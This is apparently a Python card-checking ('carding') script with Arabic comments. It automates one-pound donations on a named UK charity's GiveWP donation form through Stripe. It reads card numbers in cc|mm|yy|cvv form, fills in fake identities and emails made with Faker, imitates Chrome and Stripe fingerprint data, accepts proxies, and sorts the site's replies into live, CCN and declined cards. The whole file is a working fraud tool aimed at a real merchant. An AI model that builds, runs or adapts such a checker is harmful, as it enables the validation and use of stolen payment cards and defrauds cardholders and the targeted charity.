import re
import json
import random
import uuid
import asyncio
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[-2:]
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        if not s or not isinstance(s, str):
            return None
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}{random.randint(100,999)}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "give_receipt": ("Success", "give_receipt ✅", True),
    "give-receipt": ("Success", "give-receipt ✅", True),
    "donation-confirmation": ("Success", "donation-confirmation ✅", True),
    "receipt_id": ("Success", "receipt_id ✅", True),
    "thank": ("Success", "thank ✅", True),
    "success": ("Success", "success ✅", True),
    "donation has been": ("Success", "donation has been ✅", True),
    "contribution": ("Success", "contribution ✅", True),
    "succeeded": ("Success", "succeeded ✅", True),
    "cvc": ("CCN", "cvc ❌", False),
    "cvv": ("CCN", "cvv ❌", False),
    "security code": ("CCN", "security code ❌", False),
    "incorrect_cvc": ("CCN", "incorrect_cvc ❌", False),
    "invalid_cvc": ("CCN", "invalid_cvc ❌", False),
    "card was declined": ("Declined", "card was declined ❌", False),
    "your card could not be set up for future usage": ("Declined", "your card could not be set up for future usage ❌", False),
    "your card number is incorrect.": ("Declined", "your card number is incorrect. ❌", False),
    "requires_action": ("Declined", "requires_action ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        # نترك المعالجة لـ impersonate بدون تعارض في الـ User-Agent
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=15) as session:
            try:
                # Step 1: GET donation form to extract hash, pre, give
                headers_get = {
                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
                }
                params_get = {
                    "form-id": "7146",
                    "payment-mode": "stripe",
                    "level-id": "custom",
                    "custom-amount": "1.00",
                }
                resp_get = await session.get(
                    "https://ietuk.co.uk/donations/donation-form-1/",
                    params=params_get,
                    headers=headers_get,
                )
                html = resp_get.text
                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
                give = tools.find_between(html, 'name="give-form-id" value="', '"')
                if not hash_val or not pre or not give:
                    return "Error", "Missing form parameters", False

                # Step 2: AJAX call to reset all nonce
                headers_reset = {
                    "origin": "https://ietuk.co.uk",
                    "referer": "https://ietuk.co.uk/donations/donation-form-1/?form-id=7146&payment-mode=stripe&level-id=custom&custom-amount=1.00",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_reset = {
                    "action": "give_donation_form_reset_all_nonce",
                    "give_form_id": "7146",
                }
                resp_reset = await session.post(
                    "https://ietuk.co.uk/wp-admin/admin-ajax.php",
                    headers=headers_reset,
                    data=data_reset,
                )
                
                try:
                    reset_json = resp_reset.json()
                    idh = reset_json.get("data", {}).get("give_form_hash")
                    ido = reset_json.get("data", {}).get("give_form_user_register_hash")
                except Exception:
                    return "Error", "Invalid JSON from reset nonce", False

                if not idh or not ido:
                    return "Error", "Missing reset nonce data", False

                # Step 3: Initial donation attempt
                headers_initial = {
                    "origin": "https://ietuk.co.uk",
                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_initial = {
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Donate Now",
                    "give-current-url": "https://ietuk.co.uk/donations/donation-form-1/",
                    "give-form-url": "https://ietuk.co.uk/donations/donation-form-1/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": idh,
                    "give-price-id": "custom",
                    "give-amount": "1.00",
                    "give_stripe_payment_method": "",
                    "payment-mode": "stripe",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "give-form-user-register-hash": ido,
                    "give-purchase-var": "needs-to-register",
                    "card_name": user_data["name"],
                    "billing_country": "US",
                    "card_address": user_data["address"],
                    "card_address_2": "",
                    "card_city": user_data["city"],
                    "card_state": user_data["state"],
                    "card_zip": user_data["zip"],
                    "give_action": "purchase",
                    "give-gateway": "stripe",
                    "action": "give_process_donation",
                    "give_ajax": "true",
                }
                await session.post(
                    "https://ietuk.co.uk/wp-admin/admin-ajax.php",
                    headers=headers_initial,
                    data=data_initial,
                )

                # Step 4: Get Stripe fingerprint (مع معالجة استثناء الأخطاء)
                headers_stripe = {
                    "origin": "https://m.stripe.network",
                    "referer": "https://m.stripe.network/",
                    "content-type": "text/plain;charset=UTF-8",
                }
                resp_stripe = await session.post("https://m.stripe.com/6", headers=headers_stripe, data="{}")
                try:
                    stripe_data = resp_stripe.json()
                    guid = stripe_data.get("guid")
                    muid = stripe_data.get("muid")
                    sid = stripe_data.get("sid")
                except Exception:
                    guid, muid, sid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())

                # Step 5: Create payment method via Stripe
                client_session_id = str(uuid.uuid4())
                elements_session_config_id = str(uuid.uuid4())

                headers_pm = {
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                }
                data_pm = {
                    "type": "card",
                    "billing_details[name]": user_data["name"],
                    "billing_details[email]": user_data["email"],
                    "billing_details[address][line1]": user_data["address"],
                    "billing_details[address][line2]": "",
                    "billing_details[address][city]": user_data["city"],
                    "billing_details[address][state]": user_data["state"],
                    "billing_details[address][postal_code]": user_data["zip"],
                    "billing_details[address][country]": "US",
                    "card[number]": card_data["cc"],
                    "card[cvc]": card_data["cvv"],
                    "card[exp_month]": card_data["mm"],
                    "card[exp_year]": card_data["yy"],
                    "guid": guid,
                    "muid": muid,
                    "sid": sid,
                    "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; split-card-element",
                    "referrer": "https://ietuk.co.uk",
                    "time_on_page": str(random.randint(10000, 99999)),
                    "client_attribution_metadata[client_session_id]": client_session_id,
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "split-card-element",
                    "client_attribution_metadata[merchant_integration_version]": "2017",
                    "client_attribution_metadata[wallet_config_id]": elements_session_config_id,
                    "key": "pk_live_51PVC6sFzbukajckZRX9IVkSEB1bcI2g831r7HgD4VK0ZAk2U0572Ya56wQXlyqGdVM62Fj7SXlR7oCSwyJEmq3ZG002t8GWayN",
                    "_stripe_account": "acct_1PVC6sFzbukajckZ",
                }
                resp_pm = await session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers_pm,
                    data=data_pm,
                )
                
                try:
                    pm_json = resp_pm.json()
                    payment_method_id = pm_json.get("id")
                except Exception:
                    return "Error", "Stripe API response error", False

                if not payment_method_id:
                    err_msg = pm_json.get("error", {}).get("message", "Failed to create Stripe payment method")
                    return "Declined", f"Stripe Error: {err_msg}", False

                # Step 6: Final POST with payment method
                headers_final = {
                    "origin": "https://ietuk.co.uk",
                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
                }
                data_final = data_initial.copy()
                data_final["give_stripe_payment_method"] = payment_method_id

                resp_final = await session.post(
                    "https://ietuk.co.uk/donations/donation-form-1/",
                    params={"payment-mode": "stripe", "form-id": "7146"},
                    headers=headers_final,
                    data=data_final,
                )
                response_text = resp_final.text.lower()

                # Step 7: Classification
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                error_match = re.search(r'<p[^>]*>.*?<strong>error</strong>:\s*(.*?)</p>', response_text, re.DOTALL | re.IGNORECASE)
                if error_match:
                    err_msg = error_match.group(1).strip()
                    for key, (status, msg, is_live) in RESPONSE_MAP.items():
                        if key in err_msg:
                            return status, msg, is_live
                    return "Declined", f"Declined: {err_msg} ❌", False

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_ST_1_charge(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )


# ==========================================
# دالة الاختبار الرئيسية (Main Function)
# ==========================================
async def main():
    # بطاقة اختبار قياسية لـ Stripe
    test_card = "4242424242424242|12|28|321"
    proxy = None  # يمكنك وضع البروكسي هنا إذا لزم الأمر

    print("🚀 جاري اختبار البوابة (ST Charge)...")
    print(f"💳 البطاقة: {test_card}")
    
    status, message, is_live = await process_ST_1_charge(test_card, proxy_url=proxy)
    
    print("\n--- نتيجة التنفيذ ---")
    print(f"الحالة  : {status}")
    print(f"الرسالة : {message}")
    print(f"مقبولة  : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
